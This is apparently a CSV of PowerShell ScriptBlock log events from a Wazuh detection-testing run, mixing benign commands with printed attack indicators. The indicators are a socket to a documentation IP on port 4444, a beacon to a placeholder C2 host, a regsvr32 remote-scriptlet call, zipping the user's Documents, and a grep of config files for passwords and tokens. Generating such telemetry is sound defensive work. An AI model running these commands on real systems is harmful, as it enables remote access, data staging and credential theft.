sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-001,PST-001,mapped,1,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721274,2026-07-17T09:35:23.7572981Z,4104,777b26ba-ee04-437a-874f-e8e9450b38f9,1,1,exact,a23d3b2c0003c31719a253222598d314233d55fa4edc9c25155f82e22803298e,"$sampleId='PST-001'; $parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-002,PST-002,mapped,2,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721289,2026-07-17T09:35:24.1662059Z,4104,4f5c374f-24f4-4aa7-bc2f-5456705525f8,1,1,exact,d05853d63042b65f0e5bafc5c67f260a0c2ac0f8b23dc7681fd0ab0298878313,"$sampleId='PST-002'; $template = 'backup_path=%ProgramData%\Company\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-003,PST-003,mapped,3,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721292,2026-07-17T09:35:24.5070609Z,4104,dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b,1,1,exact,029b75fb615a222f402515c4cccb2f77efe55a052544aa61cfaced86882ddab3,"$sampleId='PST-003'; $parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-004,PST-004,mapped,4,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721298,2026-07-17T09:35:24.8512906Z,4104,68622779-1caf-4164-abe4-0e23fa361c76,1,1,exact,e78d14da6923efd6dbcb542c5bf9f455ca804f557dabfc9d0b62cf47b8a9c969,"$sampleId='PST-004'; $parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-005,PST-005,mapped,5,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721301,2026-07-17T09:35:25.1917291Z,4104,953ef77d-a0f3-4116-ae94-dc9f6de670c0,1,1,exact,ef3de9d0b96366183c51492042d4326bc421fc8d4e977d7939c84ebf38a7a92a,"$sampleId='PST-005'; $parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-006,PST-006,mapped,6,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721306,2026-07-17T09:35:25.5393064Z,4104,fde79fe3-5839-4518-8cfc-b38b6ab035a4,1,1,exact,fa3fa5f78751f471b3ea673bcb5c05dca73e71223751fa5c6ddeea87a6b75e2b,"$sampleId='PST-006'; Get-Service | Select-Object -First 8 Name, Status; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-007,PST-007,mapped,7,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721321,2026-07-17T09:35:25.9407615Z,4104,8205fa2f-e9fb-4659-a6b0-638e4083a988,1,1,exact,e3960b936d3880409e4f4cb2aa952a7b1dd7f58533b95b86073d2cbfaa2546b2,"$sampleId='PST-007'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-008,PST-008,mapped,8,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721417,2026-07-17T09:35:33.5952252Z,4104,66069552-91e3-44f8-80ca-82b0a3fa20e4,1,1,exact,7b50610d0331ee74b41dd1d4361fd7b754300819778ce4a9c857aac0f04aa19c,"$sampleId='PST-008'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-009,PST-009,mapped,9,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721431,2026-07-17T09:35:33.9849086Z,4104,fafedcde-d6a2-477f-a45b-7a1cfe464c33,1,1,exact,98b2deda87860276a55a3294336a4c78c681afdbde632db42abe8543fabe48d0,"$sampleId='PST-009'; $indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-010,PST-010,mapped,10,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721433,2026-07-17T09:35:34.3149102Z,4104,2643a03f-5ea6-44b8-abc2-5117734d10c3,1,1,exact,01d0cdda7a5f8832c33ea6f45089bd1bf17162901b3684313f7ea99b8a7aac9b,"$sampleId='PST-010'; $indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 'nv:TEMP\' + 'collect.zip'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-011,PST-011,mapped,11,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721435,2026-07-17T09:35:34.6381988Z,4104,1740d1f0-125d-479b-8938-5802753cfe3f,1,1,exact,5efe4a3e7b12e746bf2dd612df666438ed37be6ed2a9d9f1dc521aed72a04be6,"$sampleId='PST-011'; $indicator='Get-ChildItem -Path ''C:\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
